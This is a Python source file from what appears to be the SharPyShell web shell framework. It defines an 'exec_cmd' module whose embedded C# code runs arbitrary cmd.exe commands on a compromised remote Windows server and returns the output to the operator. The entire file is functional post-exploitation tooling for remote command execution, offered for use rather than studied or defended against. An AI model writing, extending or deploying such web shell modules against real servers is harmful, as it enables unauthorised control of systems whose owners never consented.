from core.Module import Module, ModuleException


class ExecCmdModuleException(ModuleException):
    pass


class Exec_cmd(Module):
    _exception_class = ExecCmdModuleException
    short_help = "Run a cmd.exe /c command on the server"
    complete_help = r"""
        This module run a cmd.exe /c on the remote server.
        You can specify the command requested and the arguments to be passed.
        This module spawn a new process on the remote server and the current directory as the working directory
        of the process.
        Note that you should use the 'cd' command of the prompt to change your working directory.
        You should never use '#exec_cmd cd C:\dir', but instead 'cd C:\dir'.
    
        Usage:
            #exec_cmd os_command [args]
            
        Positional arguments:
            os_command               command supported by cmd.exe
            args                     the commandline arguments to be passed
            
        Examples:
            List current directory files:
                #exec_cmd dir
            Write a new file to the disk:
                #exec_cmd echo test > C:\Windows\Temp\test.txt
    """

    _runtime_code = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell
                {                    
                    string ExecCmd(string arg, string working_path)
                    {
                        ProcessStartInfo pinfo = new ProcessStartInfo();
                        pinfo.FileName = Environment.GetEnvironmentVariable("ComSpec");
                        pinfo.Arguments = "/c " + arg;
                        pinfo.RedirectStandardOutput = true;
                        pinfo.RedirectStandardError = true;
                        pinfo.UseShellExecute = false;
                        pinfo.WorkingDirectory = working_path;
                        Process p = new Process();
                        try{
                            p = Process.Start(pinfo);
                        }
                        catch (Exception e){
                            return "{{{SharPyShellError}}}\n" + e;
                        }
                        StreamReader stmrdr_output = p.StandardOutput;
                        StreamReader stmrdr_errors = p.StandardError;
                        string output = "";
                        string stand_out = stmrdr_output.ReadToEnd();
                        string stand_errors = stmrdr_errors.ReadToEnd();
                        stmrdr_output.Close();
                        stmrdr_errors.Close();
                        if (!String.IsNullOrEmpty(stand_out))
                            output = output + stand_out;
                        if (!String.IsNullOrEmpty(stand_errors))
                            output = "{{{SharPyShellError}}}\n" + output + stand_errors;
                        return output;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=ExecCmd(@"%s", @"%s");
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
                """

    def _create_request(self, args):
        cmd = ' '.join(args)
        working_path = self._module_settings['working_directory']
        return self._runtime_code % (cmd, working_path)


